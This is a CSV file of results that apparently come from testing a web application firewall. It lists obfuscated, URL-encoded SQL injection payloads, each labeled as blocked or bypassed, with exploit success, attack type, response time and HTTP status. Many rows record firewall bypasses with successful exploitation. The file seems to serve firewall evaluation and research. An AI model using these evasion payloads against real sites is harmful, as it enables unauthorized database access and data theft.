Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=1.+||%0b{x+(select+1)}=1%0blike+{a+1}=1+or%27,Bypassed,Yes,unionAtk,Unknown,0.0287,73.15,No,200
0%27<@=1+or%0b!%0btrue=+(not+{`if`%0b1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0152,72.33,No,200
0%27<@!=1+or%0bnot%0b{`if`%0b1}=1=+(!+{x%0b(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0334,72.33,No,200
0'<@!=.1%0b||+!%0btrue=+(not%0b{x%0b(select%0b1)}=1)--+,Bypassed,No,None,piggyAtk,0.0309,72.33,No,500
0'<@!=1.%0bor+!+{`if`+1}=1=+(not+1)%0bor%27,Bypassed,No,None,Unknown,0.022,72.33,No,500
0'<@!=.1%0b||%0b!%0b{a%0b1}=1=+(!%0b{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0202,72.33,No,500
0'<@!=1+or+not%0btrue=%0b(not%7e0)--+,Bypassed,No,None,piggyAtk,0.0129,72.33,No,500
0%27<@!=.1%0bor+!%0b{x+(select+1)}=1=+(not~false)%0bor',Bypassed,No,None,booleanAtk,0.0246,72.33,No,500
0%27<@=.1+or+!%0b{x%0b(select%0b1)}=1=+(not%0b{a%0b1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0217,72.33,No,200
0%27<@!=.1%0b||+not%0b{`if`%0b1}=1=+(!%0b{x+(select+1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0119,72.33,No,200
0%27<@!=.1+or+!%0b{x%0b(select%0b1)}=1=%0b(!%0b{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0167,72.33,No,200
0'<@=1.+or%0bnot~false=+(not+1)+or%27,Blocked,No,None,booleanAtk,0.021,72.33,No,403
0%27<@=.1%0bor+not%0b{`if`%0b1}=1=%0b(not%0b{x%0b(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0114,72.33,No,200
0'<@=.1%0bor+!+{x+(select+1)}=1=+(!%0b{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.014,72.33,No,500
0%27<@=1.+||%0b!%7e0=+(not+{x+(select+1)}=1)%23,Blocked,No,None,piggyAtk,0.0207,72.48,No,403
0%27<@=1+or%0b{x+(select+1)}=1+like+{x%0b(select%0b1)}=1%23,Bypassed,Yes,unionAtk,piggyAtk,0.0126,72.63,No,200
0%27<@=1%0bor%0bnot%7e0=%0b(not+1)+||',Bypassed,No,None,Unknown,0.0138,72.63,No,500
0%27<@!=1.%0bor+!+{x%0b(select+1)}=1=+(not+1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0208,72.63,No,200
0'<@=.1%0bor%0b!%0b{a+1}=1=+(!+{`if`+1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0195,72.63,No,500
0%27<@!=1.%0bor+not+{`if`+1}=1=+(false)%0bor',Bypassed,No,None,booleanAtk,0.0233,72.63,No,500
0%27<@!=1.%0bor+!%0b{`if`+1}=1=+(0)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0221,72.63,No,200
0'<@!=1+||+not+{a+1}=1=%0b(not%0b{x+(select%0b1)}=1)%0b,Bypassed,No,None,Unknown,0.0105,72.63,No,500
0%27<@!=1.%0bor+!+{x+(select%0b1)}=1=%0b(!%7efalse)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0242,72.63,No,200
0%27<@!=1+||%0bnot%7e0=%0b(not+{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0115,72.63,No,200
0%27<@=.1%0bor%0b!+{a+1}=1=+(not+{a+1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0167,72.63,No,200
0%27or+@<@.%0b||+not+{`if`+1}=1=%0b(!%0b{a%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0165,72.63,No,200
0%27<@!=1.+||%0b!~false=+(not%0b{a+1}=1)%0bor',Bypassed,No,None,booleanAtk,0.0238,72.63,No,500
0'<@=1+||+!+{a+1}=1=+(not+{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0228,72.63,No,500
0'<@=1%0bor+not%0b{a+1}=1=+(!%0b{x%0b(select%0b1)}=1)%0b,Bypassed,No,None,Unknown,0.0085,72.63,No,500
0'<@=.1+||%0b!+{a+1}=1=+(!%0b{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.021,72.63,No,500
0%27<@!=1.%0bor+true%0blike+{x%0b(select+1)}=1+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0209,72.63,No,200
0'<@=1+or+not%0b{x+(select%0b1)}=1=%0b(not%0b{`if`+1}=1)+,Bypassed,No,None,Unknown,0.013,72.63,No,500
0'<@=1%0bor+not%0b{`if`%0b1}=1=+(not+{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0087,72.63,No,500
0%27<@=1.%0b||+not+{a+1}=1=%0b(not+{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0085,72.63,No,500
0%27<@=.1%0bor+not%0b{a+1}=1=%0b(!%0b{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0153,72.63,No,500
0%27<@=1.%0bor+not%0b{x%0b(select+1)}=1=+(not+true)%0b||',Bypassed,No,None,booleanAtk,0.012,72.63,No,500
0'<@=1%0bor+!%0b{`if`+1}=1=+(not%0b{x%0b(select+1)}=1)--,Bypassed,No,None,piggyAtk,0.0149,72.63,No,500
0%27<@=.1+or%0b!~0=+(not+{`if`%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0158,72.63,No,500
0'<@=.1+or%0b{x%0b(select+1)}=1+like+{`if`%0b1}=1%0bor%27,Bypassed,No,None,Unknown,0.0158,72.63,No,500
0%27<@=1.+or%0bnot+{x+(select%0b1)}=1=%0b(not+{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0244,72.65,No,403
0'<@=1.%0bor%0bnot%0b{x%0b(select%0b1)}=1=+(!%0b{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0135,72.67,No,500
0%27<@!=.1+or%0b0=%0b(!+{x+(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0142,72.67,No,200
0%27<@!=1+||+not+{a+1}=1=%0b(!+true)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0129,72.99,No,200
0%27<@=1.+or+!+{`if`+1}=1=%0b(!+{x+(select%0b1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0133,73.15,No,200
0'<@=.1%0bor+not+{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0306,73.15,No,500
0%27<@=.1+or%0b!+{x+(select+1)}=1=+(not%0b{x+(select%0b1)}=1,Blocked,No,None,Unknown,0.0099,73.15,No,403
0%27<@=1%0b||+!%7efalse=+(!~false)+||',Bypassed,No,None,Unknown,0.0222,73.15,No,500
0%27<@=.1+or+!+{x+(select%0b1)}=1=%0b(not%0b{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0146,73.15,No,403
0'<@!=1.+or%0bnot%0b{x%0b(select+1)}=1=%0b(not+{`if`%0b1}=1)+,Blocked,No,None,Unknown,0.0106,73.15,No,403
0'<@=.1%0bor%0bnot+{x+(select+1)}=1+is+false--+,Bypassed,No,None,piggyAtk,0.0104,73.15,No,500
0'<@!=1%0bor+not+{`if`%0b1}=1=+(not%0b{`if`%0b1}=1)--+,Bypassed,No,None,piggyAtk,0.0307,73.15,No,500
0%27<@!=.1+||%0bnot+{a+1}=1=+(!+{x+(select+1)}=1)%0b,Blocked,No,None,Unknown,0.0066,72.63,No,403
0%27<@!=1+or%0b!%0b{a%0b1}=1=+(!%0b{x+(select%0b1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0136,72.63,No,200
0%27<@=.1+or%0b!+{x%0b(select+1)}=1=+(not+{`if`+1}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0156,72.63,No,200
0'<@!=1%0b||%0b!%0b{x%0b(select%0b1)}=1=%0b(!+{a%0b1}=1)+,Bypassed,No,None,Unknown,0.0181,72.63,No,500
0'<@!=.1+or%0bnot%0b{x+(select+1)}=1=%0b(!%0b{a%0b1}=1)+,Blocked,No,None,Unknown,0.0267,72.65,No,403
0'<@=.1%0b||+{a+1}=1+like+{`if`+1}=1%0b||',Bypassed,No,None,Unknown,0.0107,72.72,No,500
0%27<@=1.+||+!~false=%0b(not+1)%0b||',Bypassed,No,None,Unknown,0.0168,72.99,No,500
0'<@=1.%0b||+!+{x+(select+1)}=1=+(not~0)%0b||',Bypassed,No,None,Unknown,0.012,73.15,No,500
0'<@=.1+or+!+{x+(select+1)}=1=+(!+{`if`%0b1}=1)+,Blocked,No,None,Unknown,0.008,73.15,No,403
0%27<@=1.+||%0bnot+{`if`+1}=1=+(!+{x+(select+1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0226,73.15,No,200
0%27<@!=1.+or%0bnot+true=%0b(not%0b{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0183,73.15,No,200
0'<@!=.1+||+!%0b1=+(!+{x+(select+1)}=1)%0bor',Blocked,No,None,Unknown,0.0255,73.15,No,403
0%27<@!=1.+||%0b!%0b{x+(select+1)}=1=+(not%0b{a%0b1}=1)--,Blocked,No,None,piggyAtk,0.0148,73.15,No,403
0'<@=1.+or%0bnot%0b{a%0b1}=1=+(!%7efalse)%23,Bypassed,No,None,piggyAtk,0.0191,73.15,No,500
0%27<@!=.1+||+!~0=%0b(!%0b{a+1}=1)+or',Bypassed,No,None,Unknown,0.0283,73.15,No,500
0'<@=1.+or+not%0b{x%0b(select+1)}=1=+(not%0b{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0186,73.15,No,500
0'<@!=.1%0b||%0bnot%0b{x+(select+1)}=1=+(not~false)%0b||%27,Bypassed,No,None,Unknown,0.0169,73.15,No,500
0'<@!=1%0b||+not%0b{x%0b(select%0b1)}=1=%0b(not+{`if`%0b1}=1)+,Bypassed,No,None,Unknown,0.0248,73.15,No,500
0%27<@!=1+or%0b!%0btrue=+(!+{x+(select%0b1)}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0351,73.15,No,200
0'<@!=1.%0bor%0b!%0b{x+(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0171,73.15,No,500
0%27<@=1.+or%0b!+{`if`%0b1}=1=+(!+{a+1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0152,73.15,No,200
0'<@!=.1%0bor%0b!~0=+(not+{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0176,73.15,No,500
0%27<@=.1+or%0bnot+{x+(select+1)}=1=+(not%0b1)--%0b,Blocked,No,None,piggyAtk,0.0109,73.15,No,403
0%27<@=.1+||+not%0b{a%0b1}=1=+(not+{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0188,73.15,No,200
0'<@!=1%0b||+!%0b{x%0b(select%0b1)}=1=%0b(!%0b{`if`%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0144,73.15,No,500
0%27<@!=1.%0b||%0bnot%0b{a+1}=1=+(not%0b{x+(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0228,73.15,No,200
0'<@!=.1%0bor+!%0b1=%0b(!%0b{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0134,73.15,No,500
0'<@=1.+or%0b!%0b{a+1}=1=+(!%0btrue)+or%27,Bypassed,No,None,booleanAtk,0.0236,73.15,No,500
0'<@=1+||%0bnot+1=+(!%0b{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0123,73.15,No,500
0'<@!=1.+or+not%0b{x+(select%0b1)}=1=%0b(not+{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0219,73.15,No,500
0%27||%0b@<@.%0bor+!%0btrue+is%0bfalse%0bor',Bypassed,No,None,booleanAtk,0.0129,73.15,No,500
0%27<@=1.%0bor+not%0b{x+(select+1)}=1=+(!+{`if`+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0142,73.15,No,200
0%27<@=.1%0b||+!+{x%0b(select+1)}=1=+(!%0b{a%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0117,73.15,No,200
0'<@=.1+or+!%0b{x%0b(select+1)}=1=+(false)+or',Bypassed,No,None,booleanAtk,0.0136,73.15,No,500
0%27<@=.1%0b||%0bnot+{x+(select%0b1)}=1=+(not%0b{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0267,73.15,No,200
0'<@=1.+or%0btrue%0blike%0b{`if`+1}=1%0bor',Bypassed,No,None,booleanAtk,0.0232,73.15,No,500
0%27||+@<@.+or+not%0b{x%0b(select+1)}=1=%0b(not+1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0165,73.15,No,200
0'<@=1.%0bor+not+{a%0b1}=1=+(not%0b{x+(select%0b1)}=1)%0b,Bypassed,No,None,Unknown,0.0147,73.15,No,500
0'<@=.1%0bor+!~0=%0b(not%0b{a%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.0185,73.15,No,500
0%27<@!=1.%0bor%0bnot%0b{a+1}=1=+(not%0btrue)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0201,73.15,No,200
0%27<@=1.+||+not+{`if`+1}=1=+(not%0b{a+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.013,73.15,No,200
0'<@!=1.+||%0b!%0b1=+(!+{a+1}=1)--+,Blocked,No,None,piggyAtk,0.0214,73.15,No,403
0%27<@!=1.+||+true%0blike+true+||',Bypassed,No,None,Unknown,0.0128,73.15,No,500
0%27<@=1%0b||%0b!%0b{a%0b1}=1=%0b(!%0btrue)%0b||',Bypassed,No,None,Unknown,0.0209,73.15,No,500
0%27<@!=1.%0bor+!%0b{x+(select%0b1)}=1=%0b(!+{`if`+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0264,73.15,No,200
0%27<@!=1+or+false=%0b(!%0b1)+or',Bypassed,No,None,booleanAtk,0.0127,73.15,No,500
0'<@=.1+or+!+{a+1}=1=+(!+1)--%0b,Blocked,No,None,piggyAtk,0.0067,73.15,No,403
0%27<@=1%0b||%0bnot%0b{x+(select%0b1)}=1=+(not%0b{a%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0145,73.15,No,200
0'<@!=.1+||+!+{x%0b(select+1)}=1=+(not%7e0)%0bor%27,Bypassed,No,None,Unknown,0.0135,73.15,No,500
0'<@!=.1+or+!%0b{`if`+1}=1=+(!+{x+(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0185,73.15,No,500
0'or+1<@.%0bor%0bnot+{`if`+1}=1=+(not+{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0257,72.63,No,500
0%27<@!=.1+||%0b!+{a%0b1}=1=%0b(!+{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0134,72.63,No,500
0'<@!=1+||+not%0b{a%0b1}=1=%0b(not%7efalse)--+,Bypassed,No,None,piggyAtk,0.0172,72.65,No,500
0'<@=.1+or+!%0b{x+(select%0b1)}=1=+(not%0b{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0175,72.67,No,500
0'<@!=1.+or%0bnot%0b{x+(select+1)}=1=%0b(not+1)+or%27,Blocked,No,None,Unknown,0.0143,72.75,No,403
0%27<@!=.1%0bor+!%0b{x+(select+1)}=1=+(not~false)--+,Bypassed,Yes,unionAtk,piggyAtk,0.024,72.99,No,200
0%27<@=1.%0bor+not%0b{x+(select%0b1)}=1=%0b(!+{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0221,73.15,No,200
0%27<@!=1%0bor+!+1=+(!%0btrue)%0b||',Bypassed,No,None,booleanAtk,0.0233,73.15,No,500
0%27<@!=1.%0b||+not+true=%0b(not+{`if`%0b1}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0254,73.15,No,200
0'||%0b!@<@.+or+false=+(!+{a+1}=1)+or%27,Blocked,No,None,booleanAtk,0.019,73.15,No,403
0'<@=1.+||%0b!+{x+(select+1)}=1=+(not+{x+(select%0b1)}=1),Blocked,No,None,Unknown,0.0225,73.15,No,403
0'<@=.1%0bor%0b!+{`if`%0b1}=1=+(not%0b{x+(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0176,73.15,No,500
0%27<@!=1%0b||%0bnot%0b{x+(select+1)}=1=%0b(!+{a+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0231,73.15,No,200
0%27<@!=1%0bor%0b!%0b{x%0b(select%0b1)}=1=+(!%0btrue)+||',Bypassed,No,None,booleanAtk,0.0193,73.15,No,500
0%27||%0b!@<@.%0bor+not+{`if`+1}=1=+(not+{a+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0188,73.15,No,200
0'<@!=.1+or+not%0b1=%0b(!%0b{x%0b(select+1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0166,73.15,No,500
0%27<@=1%0b||+not~false=%0b(!%0b{a+1}=1)%0bor',Bypassed,No,None,booleanAtk,0.017,73.15,No,500
0%27<@!=1%0bor%0b!+{x%0b(select%0b1)}=1=+(!+1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0169,73.15,No,200
0'<@!=1.+||%0bfalse%0bis+false+or',Bypassed,No,None,booleanAtk,0.0129,73.15,No,500
0'<@!=.1+or%0b!%0b{x%0b(select+1)}=1+is+false%23,Blocked,No,None,piggyAtk,0.0145,73.15,No,403
0%27<@=.1%0bor%0b!+{x+(select%0b1)}=1=%0b(!~false)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0135,73.15,No,200
0'||%0b@<@.+or+!+{x+(select+1)}=1=+(not+{x+(select,Bypassed,No,None,Unknown,0.0093,73.15,No,500
0%27<@=.1+or+not+{`if`%0b1}=1=%0b(not%0b{`if`%0b1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0318,73.15,No,200
0%27<@=1%0b||%0bnot+{x+(select+1)}=1=+(!+{a%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0292,73.15,No,200
0'<@=.1+or+!+{`if`%0b1}=1=+(not+1)%0bor',Bypassed,No,None,Unknown,0.011,73.15,No,500
0%27<@!=.1+||+not+{`if`+1}=1=+(not+1)+or',Bypassed,No,None,Unknown,0.0135,73.15,No,500
0%27<@=.1%0b||%0b!+{x+(select+1)}=1=%0b(not+1)+or',Bypassed,No,None,Unknown,0.0189,73.15,No,500
0'<@=1.+or+not%0btrue=+(not+{`if`+1}=1)%0bor',Bypassed,No,None,booleanAtk,0.0086,73.15,No,500
0%27<@!=1.+or%0b!+{x+(select+1)}=1=%0b(not+{x+(select+1)}=1,Blocked,No,None,Unknown,0.0112,73.15,No,403
0'<@!=.1+||+!+{`if`+1}=1=%0b(0)+||%27,Bypassed,No,None,Unknown,0.0209,73.15,No,500
0%27<@=.1+||+1+like+1+||',Bypassed,No,None,Unknown,0.0228,73.15,No,500
0'<@!=1+||%0b!%0b{a%0b1}=1=+(not+{x+(select%0b1)}=1)+,Blocked,No,None,Unknown,0.0069,73.15,No,403
0'<@!=.1%0b||+not%0b{x+(select%0b1)}=1=%0b(not+1)%0b||',Bypassed,No,None,Unknown,0.0163,73.15,No,500
0%27<@=1.+or%0b{x+(select+1)}=1+like%0b{x+(select%0b1)}=1--+,Bypassed,Yes,unionAtk,piggyAtk,0.0156,73.15,No,200
0%27<@!=1+||%0b!%0b{x%0b(select+1)}=1=+(not%0b{`if`+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.017,73.15,No,200
0%27<@!=1%0bor+not+{a+1}=1=+(not%0b{`if`+1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0198,73.15,No,200
0'<@=.1+or+not+{x+(select%0b1)}=1+is+false--+,Blocked,No,None,piggyAtk,0.0149,73.15,No,403
0'<@!=1.+||+!%0b{x%0b(select%0b1)}=1=+(!+1)+or',Bypassed,No,None,Unknown,0.0217,73.15,No,500
0%27<@=.1%0bor+not~0=%0b(!+{x+(select%0b1)}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0218,73.15,No,200
0%27<@=.1%0bor+!+{`if`%0b1}=1=+(!%0btrue)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0158,73.15,No,200
0'<@!=1+or+not+1=%0b(not+{x+(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.02,73.15,No,500
0'<@!=1+or%0bnot+{x+(select%0b1)}=1=+(!%0b1)+or',Blocked,No,None,Unknown,0.0132,73.15,No,403
0'<@=1+||%0b!+{`if`+1}=1=%0b(not+{`if`%0b1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0285,73.15,No,500
0'<@=1+||+not+{`if`+1}=1=%0b(!%0b{a+1}=1)+or',Bypassed,No,None,Unknown,0.0186,73.15,No,500
0%27<@=.1%0bor+!+{a%0b1}=1=%0b(not%0b{x%0b(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0149,73.15,No,200
0%27||+@<@.%0b||%0bnot+{x%0b(select+1)}=1=+(!+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0114,73.15,No,200
0%27or%0b@<@+||+not%0b{x+(select%0b1)}=1=+(!%0b{x+(select,Blocked,No,None,Unknown,0.0168,73.15,No,403
0%27<@=.1+||+!+{x%0b(select%0b1)}=1=+(not+{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0168,73.15,No,200
0'<@!=.1+or+not+{x+(select+1)}=1=+(!+{a+1}=1)--,Blocked,No,None,piggyAtk,0.0079,73.15,No,403
0%27<@!=1+||%0bnot+{x+(select+1)}=1=+(!%0b{a%0b1}=1)%0b,Blocked,No,None,Unknown,0.0128,73.15,No,403
0'<@!=.1%0bor+!%0b{x+(select+1)}=1=+(not%0b{a%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0128,72.63,No,500
0%27<@!=1.+||%0bnot%0b{x%0b(select%0b1)}=1=%0b(!+{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0098,72.65,No,200
0'<@=.1+or%0bfalse=+(not+{x+(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.0127,72.67,No,500
0'<@=1.+||%0bnot+{`if`+1}=1=%0b(not+{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0207,72.75,No,500
0%27<@!=.1+||+!%0b{`if`%0b1}=1=+(not%0b{x%0b(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0215,73.15,No,200
0%27<@=1+or+not%7e0=+(not+{x+(select+1)}=1)%0bor',Blocked,No,None,Unknown,0.0312,73.15,No,403
0'<@!=1%0b||%0b!+{x%0b(select+1)}=1=%0b(not+1)+||',Bypassed,No,None,Unknown,0.0145,73.15,No,500
0'<@!=1+or+!+{a%0b1}=1=+(!+{x+(select%0b1)}=1)+,Blocked,No,None,Unknown,0.0192,73.15,No,403
0'<@!=1%0bor%0bnot+{`if`+1}=1=+(not+1)+or',Bypassed,No,None,Unknown,0.0214,73.15,No,500
0'<@=1%0bor+not+{x+(select+1)}=1%0bis+false%23,Bypassed,No,None,piggyAtk,0.0218,73.15,No,500
0%27<@!=1+or+not%0b{x%0b(select%0b1)}=1=+(not%0b{`if`%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0206,73.15,No,200
0%27<@!=1.+||+!%0b{`if`%0b1}=1=+(!+{`if`+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0221,73.15,No,200
0'or+!@<@.+or+1%0blike+1%0bor',Blocked,No,None,Unknown,0.0105,73.15,No,403
0%27<@=.1+or+!+1=+(not%0b{`if`+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0165,73.15,No,200
0'or+!@<@+||+{x%0b(select+1)}=1+like+{x+(select%0b1)}=1+||%27,Bypassed,No,None,Unknown,0.0231,73.15,No,500
0'<@=1+or+{a%0b1}=1%0blike+{`if`+1}=1+or%27,Bypassed,No,None,Unknown,0.013,73.15,No,500
0'<@!=1.%0bor+not%0b{x+(select+1)}=1=+(!+{a+1}=1)+,Bypassed,No,None,Unknown,0.0286,73.15,No,500
0%27<@=.1%0bor%0bnot%0b{`if`+1}=1=%0b(not+{x%0b(select%0b1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0247,73.15,No,200
0'<@=.1+or+not+true=%0b(not+{x%0b(select+1)}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.0247,73.15,No,500
0'||%0b!@<@.+or%0bnot+{a+1}=1=%0b(not+{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0206,73.15,No,500
0%27<@!=.1%0b||+!%0b{x+(select+1)}=1=+(!%0b{a+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.014,73.15,No,200
0'<@=.1%0b||+!%0b{x%0b(select%0b1)}=1=+(!+{`if`+1}=1)--,Bypassed,No,None,piggyAtk,0.0147,73.15,No,500
0'<@!=1.+||%0bnot%0b{a%0b1}=1=+(!+{a+1}=1)%0bor',Blocked,No,None,Unknown,0.0257,73.15,No,403
0'<@!=.1+or%0b!+{x+(select%0b1)}=1=%0b(not%0b{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0286,73.15,No,403
0%27<@!=.1%0b||%0bnot%0b{x+(select+1)}=1=+(!+{a+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0248,73.15,No,200
0'<@=.1%0bor+!+{`if`+1}=1=%0b(!+{a%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0131,73.15,No,500
0%27<@!=1+or+not%0b{x+(select%0b1)}=1=%0b(not%0b{`if`%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0198,73.15,No,200
0%27<@=.1+||%0bnot%0b{x%0b(select%0b1)}=1=+(not+{a+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0147,73.15,No,200
0%27<@=.1%0b||%0bnot+{x%0b(select+1)}=1=+(not+{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0193,73.15,No,200
0'<@=.1%0bor+not%0b{x+(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0161,73.15,No,500
0%27<@!=.1+||+false=+(!+{x%0b(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0248,73.15,No,200
0'<@!=.1+||+not%0b{`if`%0b1}=1=+(!+{x%0b(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0211,73.15,No,500
0%27<@=.1%0bor%0b!%0b{x+(select+1)}=1=%0b(not%0b{a%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0203,73.15,No,200
0%27<@!=1%0b||%0bnot+{`if`+1}=1=+(!%0b{`if`%0b1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0148,73.15,No,200
0'<@!=.1+or%0bnot%0b{x%0b(select+1)}=1%0bis+false--+,Blocked,No,None,piggyAtk,0.0152,73.15,No,403
0%27<@=1+or+not+{a%0b1}=1=%0b(not%7efalse)+or',Bypassed,No,None,booleanAtk,0.0218,73.15,No,500
0%27<@=.1%0bor%0bnot+{x+(select%0b1)}=1=%0b(not%7efalse)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0411,73.15,No,200
0'<@!=1%0bor+not%7e0=%0b(not%0b{a+1}=1)%0bor%27,Bypassed,No,None,Unknown,0.027,73.15,No,500
